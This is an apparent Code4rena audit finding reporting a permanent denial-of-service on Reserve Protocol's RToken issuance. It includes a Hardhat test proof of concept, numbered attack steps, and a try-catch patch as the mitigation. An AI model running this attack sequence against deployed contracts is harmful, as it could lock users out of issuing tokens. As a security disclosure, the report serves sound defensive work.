## Tags

- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- MR-M-05

# [Early attacker can DOS rToken issuance](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/13) 

# Lines of code

https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L308-L312
https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L132


# Vulnerability details

## Impact
An early attacker can DOS the `issue` functionality in the `RToken` contract.  

No issuances can be made. And the DOS cannot be recovered from. It is permanent.  

## Proof of Concept
You can add the following test to the `Furnace.test.ts` file and execute it with `yarn hardhat test --grep 'M-05 Mitigation Error: DOS issue'`.  

```typescript
describe('M-05 Mitigation Error', () => {
    beforeEach(async () => {
      // Approvals for issuance
      await token0.connect(addr1).approve(rToken.address, initialBal)
      await token1.connect(addr1).approve(rToken.address, initialBal)
      await token2.connect(addr1).approve(rToken.address, initialBal)
      await token3.connect(addr1).approve(rToken.address, initialBal)

      await token0.connect(addr2).approve(rToken.address, initialBal)
      await token1.connect(addr2).approve(rToken.address, initialBal)
      await token2.connect(addr2).approve(rToken.address, initialBal)
      await token3.connect(addr2).approve(rToken.address, initialBal)

      // Issue tokens
      const issueAmount: BigNumber = bn('100e18')
      // await rToken.connect(addr1).issue(issueAmount)
      // await rToken.connect(addr2).issue(issueAmount)
    })

    it('M-05 Mitigation Error: DOS issue', async () => {
      /* attack vector actually so bad that attacker can block issuance a loooong time?
      */
      console.log("Total supply");
      console.log(await rToken.totalSupply());

      const issueAmount: BigNumber = bn('1e17')
      await rToken.connect(addr1).issue(issueAmount)

      console.log("Total supply");
      console.log(await rToken.totalSupply());

      const transferAmount: BigNumber = bn('1e16')
      rToken.connect(addr1).transfer(furnace.address, transferAmount);

      await advanceTime(3600);

      await furnace.connect(addr1).melt()
      
      await advanceTime(3600);

      console.log("rToken balance of furnace");
      console.log(await rToken.balanceOf(furnace.address));

      /* rToken can not be issued
      */

      await expect(rToken.connect(addr1).issue(issueAmount)).to.be.revertedWith('rToken supply too low to melt')

      console.log("rToken balance of furnace");
      console.log(await rToken.balanceOf(furnace.address));

      /* rToken can not be issued even after time passes
      */

      await advanceTime(3600);

      await expect(rToken.connect(addr1).issue(issueAmount)).to.be.revertedWith('rToken supply too low to melt')

      /* rToken.melt cannot be called directly either
      */

      await expect(rToken.connect(addr1).melt(transferAmount)).to.be.revertedWith('rToken supply too low to melt')
    })
  })
```

The attack performs the following steps:  

1. Issue `1e17` rToken
2. Transfer `1e16` rToken to the furnace
3. Wait 12 seconds and call `Furnace.melt` such that the furnace takes notice of the transferred rToken and can pay them out later
4. Wait at least 12 seconds such that the furnace would actually call `RToken.melt`
5. Now `RToken.issue` and `RToken.melt` are permanently DOSed

## Tools Used
VSCode

## Recommended Mitigation Steps
Use a try-catch block for `furnace.melt` in the `RToken.issueTo` function.  

```diff
diff --git a/contracts/p1/RToken.sol b/contracts/p1/RToken.sol
index 616b1532..fc584688 100644
--- a/contracts/p1/RToken.sol
+++ b/contracts/p1/RToken.sol
@@ -129,7 +129,7 @@ contract RTokenP1 is ComponentP1, ERC20PermitUpgradeable, IRToken {
         // Ensure SOUND basket
         require(basketHandler.status() == CollateralStatus.SOUND, "basket unsound");
 
-        furnace.melt();
+        try main.furnace().melt() {} catch {}
         uint256 supply = totalSupply();
 
         // Revert if issuance exceeds either supply throttle
```

The only instance when `furnace.melt` reverts is when the `totalSupply` is too low. But then it is ok to catch the exception and just continue with the issuance and potentially lose rToken appreciation.  

Potentially losing some rToken appreciation is definitely better than having this attack vector.  

The `RToken.redeemTo` function already has the call to the `furnance.melt` function wrapped in a try-catch block. So redemption cannot be DOSed.  
